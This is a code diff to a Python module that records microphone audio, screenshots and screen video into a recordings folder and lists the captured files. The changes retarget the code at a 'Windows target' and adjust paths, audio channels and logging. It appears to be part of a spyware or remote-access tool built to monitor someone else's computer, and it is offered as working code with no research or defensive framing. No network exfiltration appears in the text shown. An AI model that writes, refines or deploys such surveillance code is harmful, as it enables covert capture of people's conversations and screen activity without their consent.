@@ -4,7 +4,6 @@ import time
 import threading
 import json
 from datetime import datetime
-import base64
 
 # Audio and screen recording imports
 import pyaudio
@@ -15,20 +14,20 @@ import numpy as np
 
 from PIL import ImageGrab, Image
 import pyautogui
-
 import win32gui
 
 
 class AudioRecorder:
-    """Audio recording functionality"""
+    """Audio recording functionality for Windows target"""
     
     def __init__(self, output_dir="recordings"):
-        self.output_dir = output_dir
+        # Use absolute path to ensure proper file handling
+        self.output_dir = os.path.abspath(output_dir)
         self.is_recording = False
         self.audio_thread = None
         self.chunk = 1024  # Record in chunks of 1024 samples
         self.sample_format = pyaudio.paInt16  # 16 bits per sample
-        self.channels = 2  # Stereo
+        self.channels = 1  # Use mono for better Windows compatibility
         self.fs = 44100  # Sample rate
         self.filename = None
         self.frames = []
@@ -36,6 +35,7 @@ class AudioRecorder:
         # Ensure output directory exists
         if not os.path.exists(self.output_dir):
             os.makedirs(self.output_dir)
+        print(f"Audio recorder initialized: {self.output_dir}")
     
     def start_recording(self, duration=None, filename=None):
         """Start audio recording"""
@@ -150,10 +150,11 @@ class AudioRecorder:
 
 
 class ScreenRecorder:
-    """Screen recording and screenshot functionality"""
+    """Screen recording and screenshot functionality for Windows target"""
     
     def __init__(self, output_dir="recordings"):
-        self.output_dir = output_dir
+        # Use absolute path to ensure proper file handling
+        self.output_dir = os.path.abspath(output_dir)
         self.is_recording = False
         self.video_thread = None
         self.fps = 10.0  # Frames per second
@@ -164,21 +165,24 @@ class ScreenRecorder:
         # Ensure output directory exists
         if not os.path.exists(self.output_dir):
             os.makedirs(self.output_dir)
+        print(f"Screen recorder initialized: {self.output_dir}")
     
     def take_screenshot(self, filename=None):
-        """Take a single screenshot"""
+        """Take a screenshot on Windows target"""
         try:
             # Generate filename if not provided
             if filename is None:
                 timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                 filename = f"screenshot_{timestamp}.png"
             
+            # Use absolute path to ensure proper file creation
             filepath = os.path.join(self.output_dir, filename)
             
-            # Take screenshot using PIL
+            # Take screenshot using PIL ImageGrab (Windows only)
             screenshot = ImageGrab.grab()
             screenshot.save(filepath)
             
+            print(f"Screenshot saved to: {filepath}")
             return True, f"Screenshot saved: {filepath}"
             
         except Exception as e:
@@ -306,17 +310,20 @@ class ScreenRecorder:
 
 
 class SurveillanceRecorder:
-    """Combined audio and video surveillance recorder"""
+    """Combined audio and video surveillance recorder for Windows target"""
     
     def __init__(self, output_dir="recordings"):
-        self.output_dir = output_dir
-        self.audio_recorder = AudioRecorder(output_dir)
-        self.screen_recorder = ScreenRecorder(output_dir)
+        # Use absolute path to ensure proper file handling
+        self.output_dir = os.path.abspath(output_dir)
+        self.audio_recorder = AudioRecorder(self.output_dir)
+        self.screen_recorder = ScreenRecorder(self.output_dir)
         self.surveillance_active = False
         
         # Ensure output directory exists
         if not os.path.exists(self.output_dir):
             os.makedirs(self.output_dir)
+        
+        print(f"Surveillance recorder initialized for Windows target: {self.output_dir}")
     
     def start_surveillance(self, duration=None, audio=True, video=True):
         """Start combined audio and video surveillance"""
@@ -403,16 +410,24 @@ class SurveillanceRecorder:
         
         try:
             if os.path.exists(self.output_dir):
-                for filename in os.listdir(self.output_dir):
+                files = os.listdir(self.output_dir)
+                print(f"Found {len(files)} items in directory")
+                
+                for filename in files:
                     filepath = os.path.join(self.output_dir, filename)
                     if os.path.isfile(filepath):
                         stat = os.stat(filepath)
                         recordings.append({
                             'filename': filename,
+                            'path': filepath,
                             'size': stat.st_size,
                             'created': datetime.fromtimestamp(stat.st_ctime).isoformat(),
                             'modified': datetime.fromtimestamp(stat.st_mtime).isoformat()
                         })
+                        print(f"Added recording: {filename} ({stat.st_size} bytes)")
+            else:
+                print(f"Recordings directory does not exist: {self.output_dir}")
+                
         except Exception as e:
             print(f"Error listing recordings: {str(e)}")
         
